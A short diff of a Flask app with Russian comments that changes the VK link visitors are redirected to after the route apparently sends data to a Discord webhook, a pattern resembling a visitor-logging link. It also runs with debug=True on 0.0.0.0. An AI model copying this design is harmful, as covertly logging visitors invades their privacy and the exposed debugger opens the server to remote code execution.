@@ -66,7 +66,7 @@ def index():
         print(f"Ошибка отправки в Discord: {response.status_code} - {response.text}")
 
     # Перенаправляем пользователя на другой URL
-    return redirect('https://vk.com/1mi_musulmane_s_nami_bog')
+    return redirect('https://vk.com/zxzcursid')
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
